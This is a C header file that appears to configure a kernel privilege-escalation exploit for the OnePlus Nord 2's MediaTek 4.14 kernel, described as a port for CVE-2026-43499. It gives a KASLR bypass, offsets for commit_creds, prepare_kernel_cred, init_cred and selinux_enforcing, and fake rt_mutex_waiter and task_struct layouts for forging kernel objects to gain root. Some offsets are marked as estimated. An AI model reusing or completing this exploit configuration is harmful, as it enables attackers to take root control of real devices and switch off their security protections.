/* target.h - OnePlus Nord 2 (DN2101/DN2103) MediaTek MT6893 4.14.186
 * Ported from aristotle (MediaTek 5.10) for CVE-2026-43499
 * 
 * CRITICAL: This kernel has KASLR but we bypass it using kallsyms
 * Kernel base: 0xffffff9805280800 (_stext)
 */
#ifndef TARGET_H
#define TARGET_H

/* ============================================================
 * KASLR Configuration for Nord 2
 * ============================================================
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL  /* Standard ARM64 kernel base */

/* MediaTek 4.14 memory map */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL  /* Same as P0_PHYS_OFFSET, delta=0 */

/* Actual kernel base from kallsyms - this is critical for direct KASLR */
#define ACTUAL_KERNEL_BASE 0xffffff9805280800ULL

/* pselect waiter word shift */
#define PSELECT_WAITER_WORD_SHIFT 0

/* ============================================================
 * Kernel Symbol IMAGE Addresses (offsets from kallsyms)
 * ============================================================
 */
#define COMMIT_CREDS_OFF           0x00060f04ULL
#define PREPARE_KERNEL_CRED_OFF    0x0006129cULL
#define NOOP_LLSEEK_OFF            0x001fd140ULL
#define CAP_CAPABLE_OFF            0x003cb62cULL
#define ASHMEM_LLSEEK_OFF          0x00d854e8ULL
#define ASHMEM_IOCTL_OFF           0x00d8563cULL
#define NFULNL_LOG_PACKET_OFF      0x00ef0ab4ULL

/* IMAGE addresses (what they would be at KIMAGE_TEXT_BASE) */
#define COMMIT_CREDS_IMAGE (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
#define PREPARE_KERNEL_CRED_IMAGE (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)
#define NOOP_LLSEEK_IMAGE (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define CAP_CAPABLE_IMAGE (KIMAGE_TEXT_BASE + CAP_CAPABLE_OFF)
#define ASHMEM_LLSEEK_IMAGE (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
#define ASHMEM_IOCTL_IMAGE (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + NFULNL_LOG_PACKET_OFF)

/* ============================================================
 * KASLR Bypass Configuration
 * ============================================================
 */
#define SLIDE_NFULNL_LOGGER_IMAGE NFULNL_LOGGER_IMAGE
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + 0x01000000ULL)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + 0x01100000ULL)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + 0x01000000ULL)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + 0x01010000ULL)

/* ============================================================
 * init_task and init_cred - ESTIMATED offsets
 * ============================================================
 */
#define INIT_TASK_OFF 0x01000000ULL
#define INIT_CRED_OFF 0x01016000ULL
#define SELINUX_ENFORCING_OFF 0x01400000ULL
#define PER_CPU_OFFSET_OFF 0x01200038ULL  /* Fixed: actual offset from kallsyms */
#define ENTRY_TASK_OFF 0x01100000ULL
#define ROOT_TASK_GROUP_OFF 0x01300000ULL

#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
#define ENTRY_TASK (KIMAGE_TEXT_BASE + ENTRY_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)

/* ============================================================
 * rt_mutex_waiter layout for 4.14 (flat 10-word layout)
 * ============================================================
 */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

/* Fake waiter layout */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38

/* ============================================================
 * task_struct offsets for 4.14 - ESTIMATED, need verification
 * ============================================================
 */
#define TASK_REAL_CRED_OFF 0x6a8
#define TASK_CRED_OFF 0x6b0
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_PI_LOCK_OFF 0x6f8
#define FAKE_TASK_PI_WAITERS_OFF 0x708
#define FAKE_TASK_PI_TOP_TASK_OFF 0x718
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x720
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358

/* ============================================================
 * MM_STRUCT configuration
 * ============================================================
 */
#define MM_STRUCT_SZ 0x380  /* 896 bytes from /proc/slabinfo */

#endif /* TARGET_H */
